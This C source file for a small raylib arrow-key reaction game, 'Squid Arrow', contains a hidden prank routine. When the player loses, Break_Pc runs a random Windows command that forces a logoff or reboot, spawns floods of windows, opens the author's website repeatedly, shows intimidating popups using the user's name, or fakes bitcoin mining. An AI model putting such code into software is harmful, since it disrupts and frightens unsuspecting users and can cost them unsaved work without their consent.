#include <raylib.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <time.h>
#include <stdio.h>

void game(void);
void main_game(void);
void Draw_Background(void);
int get_random_arrow();

// Constants
int WINDOW_WIDTH;
int WINDOW_HEIGHT;

int main(void) {
    srand(time(NULL));  
    game();
    return 0;
}

// Return Random KEY
int get_random_arrow() {
    int random = rand() % 4;
    int key = 0;
    switch (random) {
        case 0: key = KEY_UP; break;
        case 1: key = KEY_DOWN; break;
        case 2: key = KEY_LEFT; break;
        case 3: key = KEY_RIGHT; break;
    }
    return key;
}

// Return Random Color
Color Get_Random_Color() {
    int random = rand() % 5;
    Color color;
    switch (random) {
        case 0:
            color = BLACK;
            break;
        case 1:
            color = RED;
            break;
        case 2:
            color = BLUE;
            break;
        case 3:
            color = GREEN;
            break;
        case 4:
            color = YELLOW;
            break;
    }
    return color;
}

// Some Fun Behaviours If The Player Lost
void Break_Pc(void) {
    int rand_break = rand() % 9;
    switch (rand_break) {
        case 0:
            for (int i = 0;i<7;i++) {
                system("start");
                system("notepad.exe");
                system("calc.exe");
            }
            break;
        case 1:
            for (int i = 0;i<7;i++) {
                system("msg * You are Gonna Hacked :)");
            }
            break;
        case 2:
            system("shutdown /l");
            break;
        case 3:
            for (int i = 0;i<7;i++) {
                system("explorer.exe");
            }
            break;
        case 4:
            system("shutdown /r");
            break;
        case 5:
            for (int i = 0;i<4;i++) {
                system("start https://0xf55.github.io/");
            }
            system("msg * This is My Web Take A Tour Or Destroying Your PC :)");
            break;
        case 6:
            for (int i = 1;i<=5;i++) {
                char img[30];
                sprintf(img, "powershell -c \"./photos/%d.jpg\"", i);
                system(img);
            }
            break;
        case 7:
            system("@echo off && color 2 && echo Mining BitCoin && echo Finding Blocks && for /l %x in (1, 1, 100) do timeout 1 > NUL && echo %RANDOM%+%x%");
            break;
        case 8:
            char cmd [50];
            char *username;
            username = getenv("USERNAME");
            sprintf(cmd,"msg * Im Coming For U %s", username);
            system(cmd);
            break;

    }
}

// Drawing The Gradient Of The Background
void Draw_Background(void) {
    DrawRectangleGradientV(0, 0, WINDOW_WIDTH, WINDOW_HEIGHT, RED, BLUE);
}

// Starting New Game
void new() {
    Draw_Background();
    DrawText("Press Enter To Start", WINDOW_WIDTH/2 - (30*5), WINDOW_HEIGHT/4, 30, WHITE);
}

void add_arrows(int (*arr)[8]) {
    for (int i = 0; i < 8; i++) {
        (*arr)[i] = get_random_arrow();
    }
}

// Drawing The Arrows
void draw_arrows(int arr[8]) {
    for (int i = 0; i < 8; i++) {
        Vector2 arrow_pos = {WINDOW_WIDTH/2 - 50, 90 + i * 36};
        const char *text = "";
        int arrow = arr[i];
        if (arrow == KEY_RIGHT) {
            text = "Right";
        } else if (arrow == KEY_LEFT) {
            text = "Left";
        } else if (arrow == KEY_DOWN) {
            text = "Down";
        } else if (arrow == KEY_UP) {
            text = "Up";
        }
        Color random_color = Get_Random_Color();
        DrawText(text, arrow_pos.x, arrow_pos.y, 30, random_color);
    }
}

// End The Game And Draw Lose Message
void Lose(Sound lose_sound, bool* running,bool* win,char *message) {
    if (!*win) {
        PlaySound(lose_sound);
        BeginDrawing();
        ClearBackground(RAYWHITE);
        Draw_Background();
        DrawText(TextFormat("%s",message),(float)WINDOW_WIDTH/2-(5*30),WINDOW_HEIGHT/4,30,WHITE);
        EndDrawing();
        sleep(1);
        Break_Pc();
        *running = false;
    }

}

void main_game(void) {
    // Loading Required Sound
    Sound start_sound = LoadSound("sounds/start.wav");
    Sound win_sound = LoadSound("sounds/win.wav");
    Sound lose_sound = LoadSound("sounds/miss.wav");
    Sound All = LoadSound("sounds/all.wav");

    // Game Variables
    float elapsedTime = 0.0f;
    int arrows[8];
    int arrow_index = 0;
    int correct = 0;
    bool running = true;
    bool win = false;

    time_t end_time = time(NULL) + 5;

    add_arrows(&arrows);

    PlaySound(start_sound);

    while (!WindowShouldClose() && running) {
        BeginDrawing();
        // Keep Drawing Arrows While Game Running
        if (!win) {
            ClearBackground(RAYWHITE);
            Draw_Background();
            draw_arrows(arrows);
        }

        // The Counter
        float delta = GetFrameTime();
        elapsedTime += delta;
        char timerText[32];
        sprintf(timerText, "Time: %.0f", elapsedTime);
        DrawText(timerText, 10, 10, 30, WHITE);

        EndDrawing();
        // Check If Time Ended
        time_t now = time(NULL);
        if (now >= end_time) {
            Lose(lose_sound, &running,&win,"You Lost Time Ended");
        }
        // Check If Player Pressed The Correct Arrow
        if (IsKeyPressed(arrows[arrow_index])) {
            PlaySound(win_sound);
            arrow_index++;
            correct++;
        } else if (IsKeyPressed(KEY_UP) || IsKeyPressed(KEY_DOWN) ||
                   IsKeyPressed(KEY_LEFT) || IsKeyPressed(KEY_RIGHT)) {
            Lose(lose_sound,&running,&win,"You Lost Try Harder");
                   }
        else if (IsKeyPressed(KEY_ENTER)) {
            running = false;
        }
        // Check if The Player Got All The Arrows
        if (correct == 8) {
            PlaySound(All);
            win = true;
            correct = 0;
            ClearBackground(RAYWHITE);
            Draw_Background();
            DrawText("You Won Press Enter To Play Again",(float)WINDOW_WIDTH/2-(8.5*30),WINDOW_HEIGHT/4,30,WHITE);
        }
    }

    // Unloading Sounds For Safe Ending
    UnloadSound(start_sound);
    UnloadSound(win_sound);
    UnloadSound(lose_sound);
    UnloadSound(All);
}

void game(void) {
    WINDOW_WIDTH = 800;
    WINDOW_HEIGHT = 450;

    InitWindow(WINDOW_WIDTH, WINDOW_HEIGHT, "Squid Arrow");
    InitAudioDevice();
    SetTargetFPS(60);
    HideCursor();

    while (!WindowShouldClose()) {
        BeginDrawing();
        ClearBackground(RAYWHITE);
        new();
        EndDrawing();

        // Start The Game
        if (IsKeyPressed(KEY_ENTER)) {
            main_game();
        }
    }

    CloseAudioDevice();
    CloseWindow();
}
